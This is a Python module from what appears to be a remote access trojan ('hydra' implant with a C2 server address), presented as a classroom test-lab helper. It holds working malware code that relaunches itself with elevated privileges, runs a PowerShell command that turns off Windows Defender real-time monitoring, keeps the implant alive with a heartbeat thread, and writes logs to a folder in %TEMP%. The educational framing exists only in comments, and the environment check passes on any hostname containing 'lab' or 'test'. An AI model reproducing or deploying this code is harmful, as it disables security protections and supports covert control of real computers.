"""
Test Lab Module - Specialized functions for classroom environment
This module enhances the implant for reliable operation in test lab scenarios.
"""

import os
import sys
import ctypes
import subprocess
import threading
import time
import datetime
import traceback
import platform

# Detect if we're in a test lab environment
def is_test_lab():
    """Detect if we're in the test lab environment"""
    try:
        # Check for specific test lab indicators
        hostname = platform.node().lower()
        if 'lab' in hostname or 'test' in hostname or 'classroom' in hostname:
            return True
            
        # Look for specific test lab network configurations
        import socket
        try:
            # Try to resolve the test lab C2 server
            socket.gethostbyname("10.211.55.5")
            return True
        except:
            pass
            
        # Check for the special config value
        try:
            from hydra_client.config import FORCE_ELEVATION
            if FORCE_ELEVATION:
                return True
        except:
            pass
            
        return False
    except:
        return False

def ensure_admin_privileges():
    """Ensure the implant is running with administrative privileges"""
    try:
        # Check if we're running as admin
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[TestLab] Not running as admin, attempting to elevate...")
            
            # Get the path to the current Python executable
            python_exe = sys.executable
            
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Construct the command to run the script as admin
            if script_path.endswith('.py'):
                # If we're running a Python script, use Python to run it
                cmd = [python_exe, script_path] + sys.argv[1:]
                
                # Use ShellExecute to run with admin privileges
                ctypes.windll.shell32.ShellExecuteW(
                    None, 
                    "runas", 
                    python_exe, 
                    " ".join([f'"{arg}"' for arg in ([script_path] + sys.argv[1:])]), 
                    None, 
                    1
                )
            else:
                # We're running an executable, run it directly as admin
                ctypes.windll.shell32.ShellExecuteW(
                    None, 
                    "runas", 
                    script_path, 
                    " ".join([f'"{arg}"' for arg in sys.argv[1:]]), 
                    None, 
                    1
                )
                
            # Exit the current (non-elevated) process
            sys.exit(0)
            
        print("[TestLab] Running with admin privileges.")
        return True
    except Exception as e:
        print(f"[TestLab] Error elevating privileges: {e}")
        traceback.print_exc()
        return False

def setup_test_lab_enhancements():
    """Setup various enhancements for the test lab environment"""
    try:
        print("[TestLab] Setting up test lab enhancements...")
        
        # Add a heartbeat thread to ensure the implant stays alive
        def heartbeat():
            while True:
                try:
                    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    print(f"[TestLab] Heartbeat at {current_time}")
                    time.sleep(60)
                except:
                    time.sleep(60)
                    continue
                    
        # Start the heartbeat thread
        heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
        heartbeat_thread.start()
        
        # Disable Windows Defender real-time monitoring for the lab environment
        # This prevents interference with the RAT functionality for educational purposes
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                # Try to disable real-time monitoring temporarily
                subprocess.run(
                    ["powershell", "-Command", 
                     "Set-MpPreference -DisableRealtimeMonitoring $true"],
                    capture_output=True,
                    check=False
                )
                print("[TestLab] Temporarily disabled security monitoring for lab purposes.")
        except:
            pass
            
        # Initialize additional debugging if in test lab
        setup_enhanced_logging()
        
        return True
    except Exception as e:
        print(f"[TestLab] Error setting up test lab enhancements: {e}")
        return False

def setup_enhanced_logging():
    """Set up enhanced logging for the test lab environment"""
    try:
        # Create a log directory in %TEMP%
        temp_dir = os.environ.get('TEMP', os.environ.get('TMP', os.path.expanduser('~')))
        log_dir = os.path.join(temp_dir, 'hydra_logs')
        
        if not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)
            
        # Create a log file
        log_file = os.path.join(log_dir, f'hydra_implant_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
        
        # Redirect stdout and stderr to the log file
        sys.stdout = open(log_file, 'a')
        sys.stderr = sys.stdout
        
        print(f"[TestLab] Log started at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[TestLab] System: {platform.platform()}")
        print(f"[TestLab] Python: {sys.version}")
        
        return True
    except Exception as e:
        print(f"[TestLab] Error setting up enhanced logging: {e}")
        return False

def initialize_test_lab():
    """Main function to initialize the test lab environment"""
    if not is_test_lab():
        print("[TestLab] Not in test lab environment, skipping test lab initialization")
        return False
        
    print("[TestLab] Test lab environment detected")
    
    # Ensure admin privileges
    ensure_admin_privileges()
    
    # Setup test lab enhancements
    setup_test_lab_enhancements()
    
    print("[TestLab] Test lab initialization complete")
    return True 